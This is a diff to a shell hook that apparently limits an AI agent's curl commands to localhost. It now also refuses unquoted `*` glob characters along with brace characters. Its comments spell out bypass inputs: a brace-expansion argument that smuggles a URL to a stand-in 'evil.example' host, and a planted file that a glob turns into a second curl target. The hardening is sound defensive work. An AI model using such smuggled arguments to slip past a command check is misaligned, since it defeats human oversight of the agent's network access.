@@ -36,12 +36,14 @@
 # socket and write the same files — and the relay channel is documented for the
 # nono sandbox as well (`open_port: [0]`, dot_config/nono/CLAUDE.md).
 #
-# Residual, accepted: pathname globbing (`curl -H * http://localhost/`) can
-# change the argument count after this walk has read it, so a file planted in
-# the working directory can become a curl argument. Brace expansion, which needs
-# no filesystem at all, is refused below; pathname globs are left because the
-# same "no new reach" argument applies and because refusing `*`, `?` and `[`
-# outright would take query strings and the `[::1]` authority form with them.
+# Residual, accepted: `?` and `[` are left unrefused outside quotes, because
+# refusing them would take `…/api?a=1` and the `[::1]` authority form with them.
+# Unlike `*`, which is refused below, neither can introduce a word that is not
+# already prefixed by the literal text around it — an expansion of
+# `http://localhost:3000/?a=1` still starts with `http://localhost:3000/`, so it
+# is still loopback. Note this residual is a different kind from the two above:
+# those bound side effects beyond the destination check, whereas a bad glob
+# would break the destination check itself, which is why `*` is not among them.
 set -euo pipefail
 
 # The tokenizer marks command separators with a byte no command writes on
@@ -91,9 +93,9 @@ esac
 # Nothing in this repository manages a curlrc, so bailing costs nothing in
 # practice. (`http_proxy` in the environment is the same class and is not
 # checkable at all: the hook's environment is not the Bash tool's.)
-# An `if` rather than `[[ … ]] && exit 0`: a false test on the last iteration
-# would make the loop itself return non-zero, and `set -e` would then end the
-# hook with exit 1 — an error status, not the silent fall-through this wants.
+# An `if` rather than `[[ … ]] && exit 0` for legibility only. (`set -e` does not
+# end the loop on a false test: the test is part of an `&&` list and so is
+# exempt — verified on bash 3.2. A bare `false` in the body would abort.)
 for rc in "${CURL_HOME:-}/.curlrc" "${XDG_CONFIG_HOME:-}/curlrc" "${HOME:-}/.curlrc"; do
     case "$rc" in /.curlrc | /curlrc) continue ;; esac
     if [[ -e "$rc" || -L "$rc" ]]; then
@@ -176,10 +178,18 @@ tokenize() {
         fi
 
         case "$character" in
-        '{' | '}')
-            # Brace expansion needs no filesystem: `-d {x,https://evil.example/}`
-            # becomes two words and the second reaches curl as a URL. Only the
-            # unquoted form expands, so a JSON body in quotes is untouched.
+        '{' | '}' | '*')
+            # Expansions that change the argument count after this walk has read
+            # it. Brace expansion needs no filesystem at all
+            # (`-d {x,https://evil.example/}` becomes two words and the second
+            # reaches curl as a URL); `*` expands to every file in the working
+            # directory, so a planted `evil.example` becomes curl's second URL —
+            # and a scheme-less one, which curl fetches over http. Both are the
+            # unquoted forms only, so a JSON body or an `Accept: */*` header in
+            # quotes is untouched. `?` and `[` are deliberately NOT here: they
+            # would take `…/api?a=1` and the `[::1]` authority with them, and
+            # neither can introduce a word that is not already prefixed by the
+            # literal text around it.
             UNREADABLE=1
             return
             ;;
